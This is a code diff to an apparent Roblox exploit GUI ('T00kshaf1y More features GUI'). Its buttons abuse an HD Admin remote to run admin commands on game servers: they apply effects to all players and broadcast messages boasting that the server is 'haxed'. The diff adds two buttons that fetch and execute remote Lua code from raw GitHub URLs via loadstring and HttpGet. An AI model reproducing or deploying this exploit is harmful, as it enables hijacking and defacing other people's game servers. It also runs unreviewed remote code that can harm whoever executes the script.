@@ -74,7 +74,7 @@ TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.BorderSizePixel = 0
 TextLabel.Size = UDim2.new(0, 464, 0, 47)
 TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "t00kshaf1y More features GUI"
+TextLabel.Text = "T00kshaf1y More features GUI"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextSize = 35.000
 
@@ -154,7 +154,7 @@ TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_8.Position = UDim2.new(0.730603456, 0, 0.15821813, 0)
 TextButton_8.Size = UDim2.new(0, 113, 0, 34)
 TextButton_8.Font = Enum.Font.SourceSans
-TextButton_8.Text = "dog all"
+TextButton_8.Text = "particle"
 TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_8.TextSize = 14.000
 
@@ -164,7 +164,7 @@ TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_9.Position = UDim2.new(0, 0, 0.210445464, 0)
 TextButton_9.Size = UDim2.new(0, 113, 0, 34)
 TextButton_9.Font = Enum.Font.SourceSans
-TextButton_9.Text = "Message(s) 1"
+TextButton_9.Text = "particle 2"
 TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_9.TextSize = 14.000
 
@@ -174,7 +174,7 @@ TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_10.Position = UDim2.new(0.243534476, 0, 0.210445464, 0)
 TextButton_10.Size = UDim2.new(0, 113, 0, 34)
 TextButton_10.Font = Enum.Font.SourceSans
-TextButton_10.Text = "Message(s) 2"
+TextButton_10.Text = "Message(s)"
 TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_10.TextSize = 14.000
 
@@ -184,7 +184,7 @@ TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_11.Position = UDim2.new(0.487068951, 0, 0.210445464, 0)
 TextButton_11.Size = UDim2.new(0, 113, 0, 34)
 TextButton_11.Font = Enum.Font.SourceSans
-TextButton_11.Text = "fog"
+TextButton_11.Text = "Message(s) 2"
 TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_11.TextSize = 14.000
 
@@ -678,9 +678,7 @@ local function ZUTSK_fake_script() -- TextButton_8.LocalScript
 	
 	button.MouseButton1Click:Connect(function()
 		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-	
-		RequestCommand:InvokeServer(";dog all")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaduhuhBL/test/58ef8b391562caaf026e6822973c58040bd67538/gfhjkk"))()
 	end)
 end
 coroutine.wrap(ZUTSK_fake_script)()
@@ -691,9 +689,7 @@ local function TTBZ_fake_script() -- TextButton_9.LocalScript
 	
 	button.MouseButton1Click:Connect(function()
 		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-	
-		RequestCommand:InvokeServer(";sm T00kshaf1y has already haxed this server")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaduhuhBL/test/58ef8b391562caaf026e6822973c58040bd67538/hffdikdnsn"))()
 	end)
 end
 coroutine.wrap(TTBZ_fake_script)()
@@ -706,7 +702,7 @@ local function TXVIBY_fake_script() -- TextButton_10.LocalScript
 		local ReplicatedStorage = game:GetService("ReplicatedStorage")
 		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-		RequestCommand:InvokeServer(";sm Team T00kshaf1y join now!!!")
+		RequestCommand:InvokeServer(";sm T00kshaf1y has already haxed this server")
 	end)
 end
 coroutine.wrap(TXVIBY_fake_script)()
@@ -719,7 +715,7 @@ local function STQOI_fake_script() -- TextButton_11.LocalScript
 		local ReplicatedStorage = game:GetService("ReplicatedStorage")
 		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 	
-		RequestCommand:InvokeServer(";fog")
+		RequestCommand:InvokeServer(";sm Team T00kshaf1y join now!!")
 	end)
 end
 coroutine.wrap(STQOI_fake_script)()
